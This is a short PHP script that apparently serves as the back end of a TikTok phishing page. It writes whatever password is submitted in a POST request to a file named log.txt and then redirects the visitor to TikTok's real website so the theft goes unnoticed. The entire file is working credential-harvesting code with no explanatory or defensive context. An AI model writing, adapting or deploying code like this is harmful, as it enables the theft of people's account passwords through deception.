<?php

    file_put_contents("log.txt", "Password: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.tiktok.com/en');
exit();